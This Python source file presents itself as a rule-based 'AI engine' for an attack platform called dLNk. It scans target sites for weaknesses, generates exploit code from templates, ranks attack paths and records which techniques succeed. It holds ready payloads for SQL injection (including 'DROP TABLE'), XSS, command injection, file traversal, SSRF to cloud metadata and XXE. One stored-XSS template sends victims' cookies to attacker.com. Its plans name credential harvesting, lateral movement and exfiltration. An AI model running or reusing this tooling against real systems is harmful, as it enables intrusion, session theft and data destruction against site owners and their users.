"""
Custom AI Engine for dLNk Attack Platform
Rule-based + Pattern Matching + Heuristic Analysis
No external API dependencies
"""

import asyncio
import re
import json
from typing import Dict, List, Optional, Tuple
from pathlib import Path
import logging

log = logging.getLogger(__name__)


class CustomAIEngine:
    """
    Custom AI Engine for Vulnerability Analysis
    
    Uses:
    - Rule-based vulnerability detection
    - Pattern matching for exploit generation
    - Heuristic analysis for success prediction
    - Knowledge base for attack strategies
    
    NO external API dependencies
    """
    
    def __init__(self, knowledge_base_path: str = None):
        self.knowledge_base_path = knowledge_base_path or "/tmp/dlnk_knowledge_base.json"
        self.knowledge_base = self._load_knowledge_base()
        
        # Vulnerability detection rules
        self.vuln_rules = self._init_vulnerability_rules()
        
        # Exploit templates
        self.exploit_templates = self._init_exploit_templates()
        
        # Attack patterns
        self.attack_patterns = self._init_attack_patterns()
    
    def _init_vulnerability_rules(self) -> Dict:
        """Initialize vulnerability detection rules"""
        
        return {
            'sql_injection': {
                'patterns': [
                    r"error in your SQL syntax",
                    r"mysql_fetch",
                    r"ORA-\d+",
                    r"PostgreSQL.*ERROR",
                    r"SQLite.*error",
                    r"ODBC.*Driver",
                ],
                'payloads': ["'", "1' OR '1'='1", "' OR 1=1--", "'; DROP TABLE--"],
                'severity': 'CRITICAL',
                'exploitability': 0.9
            },
            
            'xss': {
                'patterns': [
                    r"<script>.*</script>",
                    r"javascript:",
                    r"onerror=",
                    r"onload=",
                ],
                'payloads': [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert(1)",
                ],
                'severity': 'HIGH',
                'exploitability': 0.8
            },
            
            'rce': {
                'patterns': [
                    r"sh: .*: command not found",
                    r"bash: .*: command not found",
                    r"system\(\)",
                    r"exec\(\)",
                    r"eval\(\)",
                ],
                'payloads': [
                    "; id",
                    "| whoami",
                    "`uname -a`",
                    "$(cat /etc/passwd)",
                ],
                'severity': 'CRITICAL',
                'exploitability': 0.95
            },
            
            'lfi': {
                'patterns': [
                    r"root:x:0:0:",
                    r"\[boot loader\]",
                    r"<?php",
                ],
                'payloads': [
                    "../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "/etc/passwd%00",
                ],
                'severity': 'HIGH',
                'exploitability': 0.75
            },
            
            'ssrf': {
                'patterns': [
                    r"Connection refused",
                    r"Internal Server Error",
                    r"localhost",
                    r"127\.0\.0\.1",
                ],
                'payloads': [
                    "http://localhost",
                    "http://127.0.0.1",
                    "http://169.254.169.254/latest/meta-data/",
                ],
                'severity': 'HIGH',
                'exploitability': 0.7
            },
            
            'xxe': {
                'patterns': [
                    r"<!DOCTYPE",
                    r"<!ENTITY",
                    r"SYSTEM",
                ],
                'payloads': [
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                ],
                'severity': 'HIGH',
                'exploitability': 0.65
            },
            
            'auth_bypass': {
                'patterns': [
                    r"admin",
                    r"administrator",
                    r"root",
                    r"logged in",
                ],
                'payloads': [
                    "admin' OR '1'='1",
                    "admin'--",
                    "' OR 1=1--",
                ],
                'severity': 'CRITICAL',
                'exploitability': 0.85
            },
        }
    
    def _init_exploit_templates(self) -> Dict:
        """Initialize exploit code templates"""
        
        return {
            'sql_injection': {
                'union_based': """
# SQL Injection - UNION Based
payload = "' UNION SELECT 1,2,3,4,5--"
url = f"{target_url}?id={payload}"
response = requests.get(url)
""",
                'time_based': """
# SQL Injection - Time Based
payload = "' AND SLEEP(5)--"
start = time.time()
response = requests.get(f"{target_url}?id={payload}")
elapsed = time.time() - start
if elapsed >= 5:
    print("Vulnerable to time-based SQLi")
""",
            },
            
            'xss': {
                'reflected': """
# XSS - Reflected
payload = "<script>alert(document.cookie)</script>"
url = f"{target_url}?search={payload}"
response = requests.get(url)
if payload in response.text:
    print("Vulnerable to Reflected XSS")
""",
                'stored': """
# XSS - Stored
payload = "<script>fetch('http://attacker.com?c='+document.cookie)</script>"
data = {"comment": payload}
requests.post(f"{target_url}/comment", data=data)
""",
            },
            
            'rce': {
                'command_injection': """
# RCE - Command Injection
payload = "; whoami"
data = {"cmd": payload}
response = requests.post(f"{target_url}/execute", data=data)
print(response.text)
""",
                'php_eval': """
# RCE - PHP eval()
payload = "system('id');"
data = {"code": payload}
response = requests.post(f"{target_url}/eval.php", data=data)
""",
            },
            
            'lfi': {
                'basic': """
# LFI - Basic
payload = "../../../etc/passwd"
url = f"{target_url}?file={payload}"
response = requests.get(url)
if "root:x:0:0:" in response.text:
    print("Vulnerable to LFI")
""",
                'null_byte': """
# LFI - Null Byte
payload = "../../../etc/passwd%00"
url = f"{target_url}?file={payload}"
response = requests.get(url)
""",
            },
        }
    
    def _init_attack_patterns(self) -> Dict:
        """Initialize attack patterns and strategies"""
        
        return {
            'web_app': {
                'recon': ['subdomain_enum', 'port_scan', 'tech_detect', 'dir_bruteforce'],
                'scan': ['sql_injection', 'xss', 'rce', 'lfi', 'ssrf'],
                'exploit': ['exploit_sqli', 'exploit_xss', 'exploit_rce'],
                'post_exploit': ['credential_harvest', 'privilege_escalation', 'lateral_movement'],
            },
            
            'api': {
                'recon': ['endpoint_discovery', 'auth_analysis'],
                'scan': ['idor', 'broken_auth', 'mass_assignment'],
                'exploit': ['exploit_idor', 'exploit_broken_auth'],
                'post_exploit': ['data_exfiltration'],
            },
            
            'network': {
                'recon': ['port_scan', 'service_detection', 'os_fingerprint'],
                'scan': ['smb_vuln', 'ssh_weak_creds', 'rdp_vuln'],
                'exploit': ['exploit_smb', 'exploit_ssh', 'exploit_rdp'],
                'post_exploit': ['credential_dump', 'lateral_movement'],
            },
        }
    
    async def analyze_vulnerabilities(
        self,
        target_url: str,
        scan_results: Dict = None,
        response_data: str = None
    ) -> List[Dict]:
        """
        Analyze target for vulnerabilities using rule-based detection
        
        Args:
            target_url: Target URL
            scan_results: Previous scan results
            response_data: HTTP response data
        
        Returns:
            List of detected vulnerabilities
        """
        log.info("[CustomAI] Analyzing vulnerabilities with rule-based engine")
        
        vulnerabilities = []
        
        # Analyze response data for vulnerability patterns
        if response_data:
            for vuln_type, rules in self.vuln_rules.items():
                for pattern in rules['patterns']:
                    if re.search(pattern, response_data, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': vuln_type,
                            'severity': rules['severity'],
                            'location': target_url,
                            'exploitability': rules['exploitability'],
                            'description': f"Detected {vuln_type} via pattern matching",
                            'confidence': 0.8,
                            'payloads': rules['payloads']
                        })
                        break
        
        # Analyze scan results
        if scan_results:
            vulnerabilities.extend(self._analyze_scan_results(scan_results))
        
        # Deduplicate
        unique_vulns = self._deduplicate_vulnerabilities(vulnerabilities)
        
        log.info(f"[CustomAI] Found {len(unique_vulns)} unique vulnerabilities")
        
        return unique_vulns
    
    def _analyze_scan_results(self, scan_results: Dict) -> List[Dict]:
        """Analyze scan results for vulnerabilities"""
        
        vulnerabilities = []
        
        # Check for open ports with known vulnerabilities
        open_ports = scan_results.get('open_ports', [])
        for port_info in open_ports:
            port = port_info.get('port')
            service = port_info.get('service', '')
            
            # Known vulnerable services
            if port == 445 and 'smb' in service.lower():
                vulnerabilities.append({
                    'type': 'smb_vulnerability',
                    'severity': 'HIGH',
                    'location': f"Port {port}",
                    'exploitability': 0.75,
                    'description': 'SMB service detected - potential EternalBlue vulnerability',
                    'confidence': 0.7
                })
            
            elif port == 22 and 'ssh' in service.lower():
                vulnerabilities.append({
                    'type': 'ssh_weak_config',
                    'severity': 'MEDIUM',
                    'location': f"Port {port}",
                    'exploitability': 0.5,
                    'description': 'SSH service - check for weak credentials',
                    'confidence': 0.6
                })
        
        return vulnerabilities
    
    def _deduplicate_vulnerabilities(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Remove duplicate vulnerabilities"""
        
        seen = set()
        unique = []
        
        for vuln in vulnerabilities:
            key = (vuln['type'], vuln['location'])
            if key not in seen:
                seen.add(key)
                unique.append(vuln)
        
        return unique
    
    async def generate_exploits(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """
        Generate exploit code for detected vulnerabilities
        
        Args:
            vulnerabilities: List of vulnerabilities
        
        Returns:
            List of exploits with code
        """
        log.info("[CustomAI] Generating exploits")
        
        exploits = []
        
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            
            # Get exploit template
            if vuln_type in self.exploit_templates:
                templates = self.exploit_templates[vuln_type]
                
                for exploit_name, exploit_code in templates.items():
                    exploits.append({
                        'vulnerability_type': vuln_type,
                        'exploit_name': exploit_name,
                        'code': exploit_code,
                        'severity': vuln['severity'],
                        'exploitability': vuln['exploitability'],
                        'target': vuln['location']
                    })
        
        log.info(f"[CustomAI] Generated {len(exploits)} exploits")
        
        return exploits
    
    async def predict_success_rate(self, exploit: Dict, target_info: Dict) -> float:
        """
        Predict success rate using heuristic analysis
        
        Args:
            exploit: Exploit information
            target_info: Target information
        
        Returns:
            Success rate (0.0 - 1.0)
        """
        base_rate = exploit.get('exploitability', 0.5)
        
        # Adjust based on target characteristics
        adjustments = 0.0
        
        # Technology stack
        technologies = target_info.get('technologies', [])
        if technologies:
            # Known vulnerable technologies increase success rate
            vulnerable_tech = ['PHP 5.x', 'Apache 2.2', 'MySQL 5.0']
            for tech in technologies:
                if any(vt in tech for vt in vulnerable_tech):
                    adjustments += 0.1
        
        # Security headers
        security_headers = target_info.get('security_headers', [])
        if not security_headers:
            adjustments += 0.05
        
        # WAF detection
        has_waf = target_info.get('has_waf', False)
        if has_waf:
            adjustments -= 0.2
        
        success_rate = min(base_rate + adjustments, 0.95)
        
        return success_rate
    
    async def optimize_attack_path(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """
        Optimize attack sequence using heuristic scoring
        
        Args:
            vulnerabilities: List of vulnerabilities
        
        Returns:
            Optimized attack sequence
        """
        log.info("[CustomAI] Optimizing attack path")
        
        # Score each vulnerability
        scored_vulns = []
        for vuln in vulnerabilities:
            score = self._calculate_attack_score(vuln)
            scored_vulns.append((score, vuln))
        
        # Sort by score (highest first)
        scored_vulns.sort(reverse=True, key=lambda x: x[0])
        
        # Return optimized sequence
        optimized = [vuln for score, vuln in scored_vulns]
        
        return optimized
    
    def _calculate_attack_score(self, vuln: Dict) -> float:
        """Calculate attack priority score"""
        
        score = 0.0
        
        # Severity weight
        severity_weights = {
            'CRITICAL': 10.0,
            'HIGH': 7.0,
            'MEDIUM': 4.0,
            'LOW': 2.0
        }
        score += severity_weights.get(vuln.get('severity', 'LOW'), 2.0)
        
        # Exploitability weight
        score += vuln.get('exploitability', 0.5) * 5.0
        
        # Confidence weight
        score += vuln.get('confidence', 0.5) * 3.0
        
        return score
    
    def _load_knowledge_base(self) -> Dict:
        """Load knowledge base from disk"""
        
        kb_path = Path(self.knowledge_base_path)
        if kb_path.exists():
            try:
                with open(kb_path, 'r') as f:
                    return json.load(f)
            except:
                pass
        
        return {
            'successful_attacks': [],
            'failed_attacks': [],
            'technique_effectiveness': {},
            'target_patterns': {}
        }
    
    def _save_knowledge_base(self):
        """Save knowledge base to disk"""
        
        try:
            with open(self.knowledge_base_path, 'w') as f:
                json.dump(self.knowledge_base, f, indent=2)
        except Exception as e:
            log.error(f"[CustomAI] Failed to save knowledge base: {e}")
    
    async def learn_from_attack(self, attack_result: Dict):
        """Learn from attack results"""
        
        success = attack_result.get('success', False)
        vuln_type = attack_result.get('vulnerability_type')
        technique = attack_result.get('technique')
        
        # Store in knowledge base
        if success:
            self.knowledge_base['successful_attacks'].append(attack_result)
        else:
            self.knowledge_base['failed_attacks'].append(attack_result)
        
        # Update technique effectiveness
        if technique:
            if technique not in self.knowledge_base['technique_effectiveness']:
                self.knowledge_base['technique_effectiveness'][technique] = {
                    'success': 0,
                    'total': 0
                }
            
            self.knowledge_base['technique_effectiveness'][technique]['total'] += 1
            if success:
                self.knowledge_base['technique_effectiveness'][technique]['success'] += 1
        
        # Save to disk
        self._save_knowledge_base()


if __name__ == '__main__':
    async def test():
        engine = CustomAIEngine()
        
        # Test vulnerability analysis
        response_data = "mysql_fetch_array() error in your SQL syntax"
        vulns = await engine.analyze_vulnerabilities(
            target_url='http://example.com',
            response_data=response_data
        )
        
        print(f"Found {len(vulns)} vulnerabilities:")
        for vuln in vulns:
            print(f"  - {vuln['type']}: {vuln['severity']}")
        
        # Test exploit generation
        exploits = await engine.generate_exploits(vulns)
        print(f"\nGenerated {len(exploits)} exploits")
        
        # Test attack path optimization
        optimized = await engine.optimize_attack_path(vulns)
        print(f"\nOptimized attack sequence:")
        for i, vuln in enumerate(optimized, 1):
            print(f"  {i}. {vuln['type']} (score: {engine._calculate_attack_score(vuln):.2f})")
    
    asyncio.run(test())

